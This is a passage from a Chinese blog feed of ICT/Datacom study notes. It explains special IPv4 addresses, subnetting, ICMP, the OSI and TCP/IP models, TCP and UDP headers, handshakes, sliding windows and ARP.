&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/cec81c4fa0c67104b3afd19afeacd8cd.png&#34; alt=&#34;cec81c4fa0c67104b3afd19afeacd8cd.png&#34;&gt;&amp;lt;!--p14--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;255.255.255&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;这个地址称为有限广播地址，它可以作为一个 IP 报文的目的 IP 地址使用。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;路由器接收到目的 IP 地址为有限广播地址的 IP 报文后，会停止对该 IP 报文的转发。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;0.0.0.0&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;如果把这个地址作为网络地址，它的意思就是 “任何网络” 的网络地址；如果把这个 地址作为主机接口地址，它的意思就是 “这个网络上主机接口” 的 IP 地址。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;例如：当一个主机接口在启动过程中尚未获得自己的 IP 地址时，就可以向网络发送目 的 IP 地址为有限广播地址、源 IP 地址为 0.0.0.0 的 DHCP 请求报文，希望 DHCP 服务器在 收到自己的请求后，能够给自己分配一个可用的 IP 地址。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;127.0.0.0/8&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;这个地址为环回地址，它可以作为一个 IP 报文的目的 IP 地址使用。其作用是测试设备 自身的软件系统。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;一个设备产生的、目的 IP 地址为环回地址的 IP 报文是不可能离开这个设备本身的。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;169.254.0.0/16&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;如果一个网络设备获取 IP 地址的方式被设置成了自动获取方式，但是该设备在网络上 又没有找到可用的 DHCP 服务器，那么该设备就会使用 169.254.0.0/16 网段的某个地址来进行临时通信。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;IPv4  vs  IPv6&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;第二种解决 IP 地址短缺的办法，如图所示：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/6cc05b5b495ed01f4f491a5e7b3f3fdf.png&#34; alt=&#34;6cc05b5b495ed01f4f491a5e7b3f3fdf.png&#34;&gt;&amp;lt;!--p15--&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;子网划分&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#子网划分&#34;&gt;#&lt;/a&gt; 子网划分&lt;/h2&gt;
&lt;p&gt;“有类编址” 的地址划分过于死板，划分的颗粒度太大，会有大量的主机号不能被充分利 用，从而造成了大量的 IP 地址资源浪费。&lt;/p&gt;
&lt;p&gt;因此可以利用子网划分来减少地址浪费，即 VLSM (Variable Length Subnet Mask)，可变长子网掩码。将一个大的有类网络，划分成若干个小的子网，使得 IP 地址的使用更为科学。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/db8b9646f353a0e0a4bd15a62f755fcc.png&#34; alt=&#34;db8b9646f353a0e0a4bd15a62f755fcc.png&#34;&gt;&amp;lt;!--p16--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;step1. 原网段分析&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/6495c91154faf28e1505803e6737d0e2.png&#34; alt=&#34;6495c91154faf28e1505803e6737d0e2.png&#34;&gt;&amp;lt;!--p17--&amp;gt;&lt;/p&gt;
&lt;p&gt;假设有一个 C 类网段地址：192.168.10.0；默认情况下，网络掩码为 24 位，包括 24 位网络位，8 位主机位。所以通过计算可知，这样的网络中，有 256 个 IP 地址。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;step2. 向主机借位&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/adf939bd363c7733da3a7b72497f9497.png&#34; alt=&#34;adf939bd363c7733da3a7b72497f9497.png&#34;&gt;&amp;lt;!--p18--&amp;gt;&lt;/p&gt;
&lt;p&gt;将原有的 24 位网络位向主机位去 “借” 1 位，这样网络位就扩充到了 25 位，相对的主机位就减少到了 7 位，而借过来的这 1 位就是子网位，此时网络掩码就变成了 25 位，即 255.255.255.128，或 / 25。&lt;/p&gt;
&lt;p&gt;子网位：可取值 0 或取值 1，则得到了两个新的子网。通过计算可知，每个网络中，有 128 个 IP 地址。&lt;/p&gt;
&lt;p&gt;**step3. 计算子网的网络地址和广播地址 **&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;每个子网主机位全为 0 时，可以计算出子网网络地址。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;每个子网主机位全为 1 时。可以计算出子网广播地址。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如图：&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/c760a7fa917d82d28912c35c9672e101.png&#34; alt=&#34;c760a7fa917d82d28912c35c9672e101.png&#34;&gt;&amp;lt;!--p19--&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/a19a452a4ba8912a220163aa7b18ea48.png&#34; alt=&#34;a19a452a4ba8912a220163aa7b18ea48.png&#34;&gt;&amp;lt;!--p20--&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;icmp协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#icmp协议&#34;&gt;#&lt;/a&gt; ICMP 协议&lt;/h2&gt;
&lt;p&gt;为了更有效地转发 IP 数据报文和提高数据报文交互成功的机会，在网络层使用 ICMP 协议。 ICMP 允许主机或设备报告差错情况和提供有关异常情况的报告。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/8c50b02bf8ea848453bd6774240d3030.png&#34; alt=&#34;8c50b02bf8ea848453bd6774240d3030.png&#34;&gt;&amp;lt;!--p21--&amp;gt;&lt;/p&gt;
&lt;p&gt;ICMP 消息封装在 IP 报文中，IP 报文头部 Protocol 值为 1 时表示 ICMP 协议。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ICMP 重定向：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/b251552163caf3bec3a737891404805e.png&#34; alt=&#34;b251552163caf3bec3a737891404805e.png&#34;&gt;&amp;lt;!--p22--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ICMP 重定向过程：
&lt;ol&gt;
&lt;li&gt;主机 A 希望发送报文到服务器 A，于是根据配置的默认网关地址向网关 RTB 发送报文。&lt;/li&gt;
&lt;li&gt;网关 RTB 收到报文后，检查报文信息，发现报文应该转发到与源主机在同一网段的另一个网关设备 RTA，此转发路径是更优的路径，所以 RTB 会向主机发送一个 Redirect 消息，通知主机直接向另一个网关 RTA 发送该报文。&lt;/li&gt;
&lt;li&gt;主机收到 Redirect 消息后，会向 RTA 发送报文，然后 RTA 会将该报文再转发给服务器 A。&lt;/li&gt;
&lt;/ol&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;ICMP 差错检测：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/e94f37f1d452331472737f00f16e2423.png&#34; alt=&#34;e94f37f1d452331472737f00f16e2423.png&#34;&gt;&amp;lt;!--p23--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ICMP 的一个典型应用是 Ping。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Ping 是检测网络连通性的常用工具，同时也能够收集其他相 关信息。用户可以在 Ping 命令中指定不同参数，如 ICMP 报文长度、发送的 ICMP 报文个数、 等待回复响应的超时时间等，设备根据配置的参数来构造并发送 ICMP 报文，进行 Ping 测试。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;ICMP 错误报告：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/b336e6434280e7823a1b8b3735213f2f.png&#34; alt=&#34;b336e6434280e7823a1b8b3735213f2f.png&#34;&gt;&amp;lt;!--p24--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ICMP 定义了各种错误消息，用于诊断网络连接性问题；根据这些错误消息，源设备可以判 断出数据传输失败的原因。
&lt;ul&gt;
&lt;li&gt;如果网络中发生了环路，导致报文在网络中循环，且最终 TTL 超时，这种情况下网络 设备会发送 TTL 超时消息给发送端设备。&lt;/li&gt;
&lt;li&gt;如果目的地不可达，则中间的网络设备会发送目的不可达消息给发送端设备。目的不 可达的情况有多种，如果是网络设备无法找到目的网络，则发送目的网络不可达消息； 如果网络设备无法找到目的网络中的目的主机，则发送目的主机不可达消息。&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;ICMP 的另一个典型应用是 Tracert。Tracert 基于报文头中的 TTL 值来逐跳跟踪报文的转发路 径。为了跟踪到达某特定目的地址的路径，源端首先将报文的 TTL 值设置为 1。该报文到达第一个节点后，TTL 超时，于是该节点向源端发送 TTL 超时消息，消息中携带时间戳。然后 源端将报文的 TTL 值设置为 2，报文到达第二个节点后超时，该节点同样返回 TTL 超时消息，以此类推，直到报文到达目的地。这样，源端根据返回的报文中的信息可以跟踪到报文经过的每一个节点，并根据时间戳信息计算往返时间。&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;ipv4地址配置及基本应用&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#ipv4地址配置及基本应用&#34;&gt;#&lt;/a&gt; IPv4 地址配置及基本应用&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;IP 地址的基础配置命令&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/f758d9e08e9f2cc76a617717864a65f4.png&#34; alt=&#34;f758d9e08e9f2cc76a617717864a65f4.png&#34;&gt;&amp;lt;!--p25--&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;物理接口：物理接口是指网络设备上实际存在的接口，分为负责承担业务传输的业务接口和负责管理设备的管理接口，例如 GE 业务接口和 MEth 管理接口。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;逻辑接口：逻辑接口是指能够实现数据交换功能但物理上不存在、需要通过配置建立的接口，需要承担业务传输，例如 VLANIF 接口、Loopback 接口。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;网络 IP 地址规划&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;http://img.imfanqie.xyz/images/2022/02/13/d14237d8101a961f781fb35d13893905.png&#34; alt=&#34;d14237d8101a961f781fb35d13893905.png&#34;&gt;&amp;lt;!--p26--&amp;gt;&lt;/p&gt;
&lt;p&gt;规划原则：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;唯一性：一个 IP 网络中不能有两个主机采用相同的 IP 地址。&lt;/p&gt;
&lt;p&gt;连续性：连续地址在层次结构网络中易于进行路由汇总，大大缩减路由表，提高路由 计算的效率、加速路由收敛。&lt;/p&gt;
&lt;p&gt;扩展性：地址分配在每一层次上都要有合理的预留，在网络规模扩展时能保证路由汇 总所需的连续性。避免网络扩展造成的地址、路由重新规划。&lt;/p&gt;
&lt;p&gt;结构化、业务相关性：地址规划与网络拓扑结构和网络承载业务结合起来，便于路由 规划和 QoS 部署。好的 IP 地址规划使得每个地址都具有实际含义，看到一个地址就可 以大致判断出该地址所属的设备和对应的业务。&lt;/p&gt;
&lt;/blockquote&gt;
</content>
        <category term="ICT" />
        <updated>2022-02-11T09:58:17.262Z</updated>
    </entry>
    <entry>
        <id>http://imfanqie.top/2022/01/29/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E7%BD%91%E7%BB%9C%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/</id>
        <title>ICT笔记-网络参考模型</title>
        <link rel="alternate" href="http://imfanqie.top/2022/01/29/ICT/Datacom%E7%AC%94%E8%AE%B0/ICT%E7%AC%94%E8%AE%B0-%E7%BD%91%E7%BB%9C%E5%8F%82%E8%80%83%E6%A8%A1%E5%9E%8B/"/>
        <content type="html">&lt;ul&gt;
&lt;li&gt;理解数据的定义及传输过程&lt;/li&gt;
&lt;li&gt;理解网络参考模型的概念和优势&lt;/li&gt;
&lt;li&gt;了解常见的标准协议&lt;/li&gt;
&lt;li&gt;唱我数据的封装与解封装过程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;&lt;/p&gt;
&lt;h2 id=&#34;应用和数据&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用和数据&#34;&gt;#&lt;/a&gt; 应用和数据&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;应用：应用是为了满足人们的各种需求，比如访问网页，在线游戏、视频等。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;数据：伴随着应用会有信息的产生，数据时各种信息的载体。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;计算机只能识别 0 和 1 组成的电子数据。它不具备读取各种信息的能力，所以信息需要通过一定的规则翻译成数据。&lt;/p&gt;
&lt;h2 id=&#34;osi模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#osi模型&#34;&gt;#&lt;/a&gt; OSI 模型&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;OSI参考模型又被称为七层模型，由下至上依次为：
    ▫ 物理层：在设备之间传输比特流，规定了电平、速度和电缆针脚等物理特性。
    ▫ 数据链路层：将比特组合成字节，再将字节组合成帧，使用链路层地址（以太网使用MAC地址）来访问介质，并进行差错检测。
    ▫ 网络层：定义逻辑地址，供路由器确定路径，负责将数据从源网络传输到目的网络。
    ▫ 传输层：提供面向连接或非面向连接的数据传递以及进行重传前的差错检测。
    ▫ 会话层：负责建立、管理和终止表示层实体之间的通信会话。该层的通信由不同设备中的应用程序之间的服务请求和响应组成。
    ▫ 表示层：提供各种用于应用层数据的编码和转换功能，确保一个系统的应用层发送的数据能被另一个系统的应用层识别。
    ▫ 应用层：OSI参考模型中最靠近用户的一层，为应用程序提供网络服务。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/VEGay8sCnkcUHuv.png&#34; alt=&#34;1.png&#34;&gt;&amp;lt;!--p1--&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;tcpip模型&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#tcpip模型&#34;&gt;#&lt;/a&gt; TCP/IP 模型&lt;/h2&gt;
&lt;p&gt;TCP/IP 模型在结构上与 OSI 模型类似，采用分层架构，同时层与层之间联系紧密。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/8csJLa4pxqgdK3r.png&#34; alt=&#34;2.png&#34;&gt;&amp;lt;!--p2--&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;TCP/IP 标准参考模型将 OSI 中的数据链路层和物理层合并为网络接入层，这种划分方式其实是有悖于现实协议制定情况的，故提出并广泛使用了融合了 TCP/IP 标准模型和 OSI 模型的&lt;strong&gt; TCP/IP 对等模型&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;lt;u&amp;gt;&lt;strong&gt;TCP/IP 常见协议&lt;/strong&gt;：&amp;lt;/u&amp;gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/T4QcFtPx7gBhsfN.png&#34; alt=&#34;3.png&#34;&gt;&amp;lt;!--p3--&amp;gt;&lt;/p&gt;
&lt;h2 id=&#34;应用层协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#应用层协议&#34;&gt;#&lt;/a&gt; 应用层协议&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/hqM3zKmEoNeZgkG.png&#34; alt=&#34;4.png&#34;&gt;&amp;lt;!--p4--&amp;gt;&lt;/p&gt;
&lt;p&gt;​		 ▫ &lt;strong&gt;HTTP&lt;/strong&gt;（Hypertext Transfer Protocol，超文本传输协议）：用来访问在网页服务器上 的各种页面。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/Yxt3NXnsP9dERiG.png&#34; alt=&#34;5.png&#34;&gt;&amp;lt;!--p5--&amp;gt;&lt;/p&gt;
&lt;p&gt;​		 ▫ &lt;strong&gt;FTP&lt;/strong&gt;（File Transfer Protocol，文件传输协议）：为文件传输提供了途径，它允许数 据从一台主机传送到另一台主机上。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/vst5xBpE9DNwVcT.png&#34; alt=&#34;6.png&#34;&gt;&amp;lt;!--p6--&amp;gt;&lt;/p&gt;
&lt;p&gt;​		 ▫ &lt;strong&gt;DNS&lt;/strong&gt;（Domain Name Service，域名称解析服务）：用于实现从主机域名到 IP 地址之 间的转换。&lt;/p&gt;
&lt;h2 id=&#34;传输层协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#传输层协议&#34;&gt;#&lt;/a&gt; 传输层协议&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/a37dR8tqlNb4DJ9.png&#34; alt=&#34;8.png&#34;&gt;&amp;lt;!--p8--&amp;gt;&lt;/p&gt;
&lt;p&gt;​		▫ &lt;strong&gt;TCP&lt;/strong&gt; （Transmission Control Protocol，传输控制协议） ：为应用程序提供可靠的面 向连接的通信服务。目前，许多流行的应用程序都使用 TCP。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• TCP报文头部：
	▫ Source Port：源端口，标识哪个应用程序发送。长度为16比特。
	▫ Destination Port：目的端口，标识哪个应用程序接收。长度为16比特。
	▫ Sequence Number：序号字段。TCP链接中传输的数据流每个字节都编上一个序号。序号字段的值指的是本报文段所发送数据的第一个字节的序号。长度为32比特。
	▫ Acknowledgment Number：确认序列号，是期望收到对方下一个报文段数据的第1个字节的序号，即上次已成功接收到的数据段的最后一个字节数据的序号加1。只有Ack标识为1，此字段有效。长度为32比特。
	▫ Header Length：头部长度，指出TCP报文头部长度，以32比特（4字节）为计算单位。若无选项内容，则该字段为5，即头部为20字节。
	▫ Reserved：保留，必须填0。长度为6比特。
	▫ Control bits：控制位，包含FIN、ACK、SYN等标志位代表不同状态下的TCP数据段。
	▫ Window：窗口TCP的流量控制，这个值表明当前接收端可接受的最大的数据总数（以字节为单位）。窗口最大为65535字节。长度为16比特。
	▫ Checksum：校验字段，是一个强制性的字段，由发端计算和存储，并由收端进行验证。在计算检验和时，要包括TCP头部和TCP数据，同时在TCP报文段的前面加上12字节的伪头部。长度为16比特。
	▫ Urgent:紧急指针，只有当URG标志置1时紧急指针才有效。TCP的紧急方式是发送端向另一端发送紧急数据的一种方式。紧急指针指出在本报文段中紧急数据共有多少个字节（紧急数据放在本报文段数据的最前面）。长度为16比特。
	▫ Options：选项字段（可选），长度为0-40字节。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​		▫ &lt;strong&gt;UDP&lt;/strong&gt;（User Datagram Protocol，用户数据报协议）：提供了无连接通信，且不对传 送数据包进行可靠性的保证。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• UDP报文头部：
	▫ Source Port:源端口，标识哪个应用程序发送。长度为16比特。
	▫ Destination Port:目的端口，标识哪个应用程序接收。长度为16比特。
	▫ Length:该字段指定UDP报头和数据总共占用的长度。可能的最小长度是8字节，因为UDP报头已经占用了8字节。由于这个字段的存在，UDP报文总长不可能超过65535字节（包括8字节的报头，和65527字节的数据）。
	▫ Checksum:覆盖UDP头部和UDP数据的校验和，长度为16比特。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/9uovn6aNCOkMxjh.png&#34; alt=&#34;9.png&#34;&gt;&amp;lt;!--p9--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;TCP 和 UDP 端口号：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/QV5SP9luoixKkvt.png&#34; alt=&#34;10.png&#34;&gt;&amp;lt;!--p10--&amp;gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;TCP 建立三次握手与关闭的四次挥手&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;建立&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/2nBfCbThLY7dA4G.png&#34; alt=&#34;11.png&#34;&gt;&amp;lt;!--p11--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• TCP连接建立的详细过程如下：
	▫ 由TCP连接发起方（图中PC1），发送第一个SYN位置1的TCP报文。初始序列号a为一个随机生成的数字，因为没收到过来自PC2的任何报文，所以确认序列号为0；
	▫ 接收方（图中PC2）接收到合法的SYN报文之后，回复一个SYN和ACK置1的TCP报文。初始序列号b为一个随机生成的数字，同时因为此报文是回复给PC1的报文，所以确认序列号为a+1；
	▫ PC1接收到PC2发送的SYN和ACK置位的TCP报文后，回复一个ACK置位的报文，此时序列号为a+1,确认序列号为b+1。PC2收到之后，TCP双向连接建立。
&lt;/code&gt;&lt;/pre&gt;
&lt;ul&gt;
&lt;li&gt;关闭&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/3C4hoJcWfilRgO1.png&#34; alt=&#34;12.png&#34;&gt;&amp;lt;!--p12--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• TCP支持全双工模式传输数据，这意味着同一时刻两个方向都可以进行数据的传输。在传输数据之前，TCP通过三次握手建立的实际上是两个方向的连接，因此在传输完毕后，两个方向的连接必须都关闭。如图所示：
	▫ 1. 由PC1发出一个FIN字段置”1 ”的不带数据的TCP段；
	▫ 2. PC2收到PC1发来的FIN置位的TCP报文后，会回复一个ACK置位的TCP报文。
	▫ 3. 若PC2也没有需要发送的数据，则直接发送FIN置位的TCP报文。假设此时PC2还有数据要发送，那么当PC2发送完这些数据之后会发送一个FIN置位的TCP报文去关闭连接。
	▫ 4. PC1收到FIN置位的TCP报文，回复ACK报文，TCP双向连接断开。
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;窗口滑动机制：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/VFGagUEu39eM681.png&#34; alt=&#34;13.png&#34;&gt;&amp;lt;!--p13--&amp;gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;1. 在TCP三次握手建立连接时，双方都会通过Window字段告诉对方本端最大能够接受的字节数（也就是缓冲区大小）。
2. 连接建立成功之后，发送方会根据接受方宣告的Window大小发送相应字节数的数据。
3. 接受方接受到数据之后会放在缓冲区内，等待上层应用来取走缓冲的数据。若数据被上层取走，则相应的缓冲空间将被释放。
4. 接收方根据自身的缓存空间大小通告当前的可以接受的数据大小( Window )。
5. 发送方根据接收方当前的Window大小发送相应数量的数据。
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;网络层协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#网络层协议&#34;&gt;#&lt;/a&gt; 网络层协议&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/AjRd3SrCKxJokha.png&#34; alt=&#34;14.png&#34;&gt;&amp;lt;!--p14--&amp;gt;&lt;/p&gt;
&lt;p&gt;​		▫ &lt;strong&gt;IP&lt;/strong&gt;（Internet Protocol，互联网协议）：将传输层的数据封装成数据包并完成源站点 到目的站点的转发，提供无连接的、不可靠的服务。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;当采用 IP 作为网络层协议时，通信的双方都会被分配到一个 “独一无二” 的 IP 地址来标识自 己。IP 地址可被写成 32 位的二进制整数值形式，但为了方便人们阅读和分析，它通常被写 成点分十进制的形式，即四个字节被分开用十进制表示，中间用点分隔，比如 192.168.1.1。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt; IP数据包的封装与转发：
	▫ 网络层收到上层（如传输层）协议传来的数据时候，会封装一个IP报文头部，并且把源和目的IP地址都添加到该头部中。
	▫ 中间经过的网络设备（如路由器），会维护一张指导IP报文转发的“地图”——路由表，通过读取IP数据包的目的地址，查找本地路由表后转发IP数据包。
	▫ IP数据包最终到达目的主机，目的主机通过读取目的IP地址确定是否接受并做下一步处理。
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;​		▫ &lt;strong&gt;IGMP&lt;/strong&gt;（Internet Group Management Protocol，因特网组管理协议）：负责 IP 组播 成员管理的协议。它用来在 IP 主机和与其直接相邻的组播路由器之间建立、维护组播 组成员关系。&lt;/p&gt;
&lt;p&gt;​		▫ &lt;strong&gt;ICMP&lt;/strong&gt;（Internet Control Message Protocol，网际报文控制协议）：基于 IP 协议在网 络中发送控制消息，提供可能发生在通信环境中的各种问题反馈。通过这些信息，使 管理者可以对所发生的问题作出诊断，然后采取适当的措施解决。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/y1jGFAXHndTq9ih.png&#34; alt=&#34;15.png&#34;&gt;&amp;lt;!--p15--&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;IP 协议工作时，需要如 OSPF、IS-IS、BGP 等各种路由协议帮助路由器建立路由表，ICMP 帮 忙进行网络的控制和状态诊断。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&#34;数据链路层协议&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#数据链路层协议&#34;&gt;#&lt;/a&gt; 数据链路层协议&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/jubKpa6MtiUdYfN.png&#34; alt=&#34;16.png&#34;&gt;&amp;lt;!--p16--&amp;gt;&lt;/p&gt;
&lt;p&gt;​		▫ &lt;strong&gt;PPP&lt;/strong&gt;（Point-to-Point Protocol，点对点协议）：一种点对点模式的数据链路层协议， 多用于广域网。&lt;/p&gt;
&lt;p&gt;​		▫ &lt;strong&gt;Ethernet&lt;/strong&gt; (以太网协议)：一种多路访问广播型数据链路层协议，是当前应用最为广 泛的局域网技术。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/Pbc1Gt4uHeFsSVa.png&#34; alt=&#34;17.png&#34;&gt;&amp;lt;!--p17--&amp;gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;MAC 地址由 48 比特（6 个字节）长，12 位的 16 进制数字组成。例如：48-A4-72-1C-8F-4F&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;​		▫ &lt;strong&gt;PPPoE&lt;/strong&gt;（Point-to-Point Protocol over Ethernet，以太网承载 PPP 协议）：PPPoE 提 供通过简单桥接访问设备（接入设备）把一个网络的多个主机连接到远程访问集中器 的功能。常见的应用有家庭宽带拨号上网。&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;&lt;strong&gt;ARP 地址解析协议：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://s2.loli.net/2022/01/31/rR3TveghwmuESD1.png&#34; alt=&#34;18.png&#34;&gt;&amp;lt;!--p18--&amp;gt;&lt;/p&gt;
&lt;p&gt;ARP（Address Resolution Protocol，地址解析协议）是根据 IP 地址获取数据链路层地址的 一个 TCP/IP 协议。&lt;/p&gt;
&lt;p&gt;ARP 是 IPv4 中必不可少的一种协议，它的&lt;strong&gt;主要功能&lt;/strong&gt;是：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;将 IP 地址解析为 MAC 地址；&lt;/li&gt;
&lt;li&gt;维护 IP 地址与 MAC 地址的映射关系的缓存，即 ARP 表项；&lt;/li&gt;
&lt;li&gt;实现网段内重复 IP 地址的检测。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;工作原理&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Host1 ARP 缓存  --&amp;gt;  ARP 请求  --&amp;gt;  Host2 ARP 缓存  --&amp;gt;  ARP 响应  --&amp;gt;  Host1 ARP 缓存&lt;/p&gt;
&lt;h2 id=&#34;物理层&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#物理层&#34;&gt;#&lt;/a&gt; 物理层&lt;/h2&gt;
